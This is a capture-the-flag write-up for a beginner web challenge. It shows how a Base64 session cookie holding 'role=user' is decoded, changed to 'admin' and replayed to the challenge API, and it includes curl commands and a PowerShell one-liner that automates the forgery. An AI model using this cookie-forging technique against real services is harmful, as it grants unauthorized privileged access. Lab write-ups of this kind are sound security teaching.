# Cookie API

## Desciption
 
Lvl: 1 Score: 15 Category: web

This API here has a strange behavior. The endpoint `/api/v1/init` produces cookies. Ok! The `/api/v1/store` endpoint likes to eat cookies. LOL. Can you make it like your cookie too?

## Analysis

Sending get request to `init` doesn't give us any results, but if we look in header we can see that Cookie is being set which expires in ~1 second.

```powershell
➜ $API="http://pwnme.org:8888/api/v1"

➜ curl "$API/init"

➜ curl -sS -D - "$API/init"
HTTP/1.1 200 OK
Set-Cookie: session_token=cm9sZT11c2VyJmlkPW9vcXI0R0VCRThWWlByZDFBbk5SMmlIbFRvMDlOU2py; Expires=Sun, 02 Jul 2023 21:16:05 GMT; Secure 
Date: Sun, 02 Jul 2023 21:16:04 GMT # Request send time
Content-Length: 0
```

Cookie is in Base64 format and if we decode it we get raw cookie values.

```powershell
➜ [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(
        "cm9sZT11c2VyJmlkPUxVRm1hdVdvaU5USUgwUnFEUjZTb2Fsbm0wRWMzV2tD"
    )
)
role=user&id=LUFmauWoiNTIH0RqDR6Soalnm0Ec3WkC
```

To solve the challenge we must be admin. To become admin we must forge new cookie by modifing the cookie we get and all in 1 second.

## Solution

Process ==> Get Cookie -> Decode Base64 -> Become admin -> Encode Cookie -> curl `/store` -> Profit.

For the kicks I created powershell one liner.

```powershell
curl -sS -D - "$API/init"  |                                       # 1. Get Header
sls "session_token=(.*?);" |                                       # 2. Grab Cookie
% {                                                                # 3. For Loop "grep" Objects
  curl "$API/store" -b "session_token=$(                           # 8. Profit
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(      # 7. Encode Cookie Back To Base64
      [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String( # 5. Decode Cookie From Base64 
        $_.Matches.groups[1].Value                                 # 4. Get RegEx Match (The Cookie)
    )).replace("user", "admin"))                                   # 6. Change user To admin
  ))"
}
SecVal{REDACTED}
``` 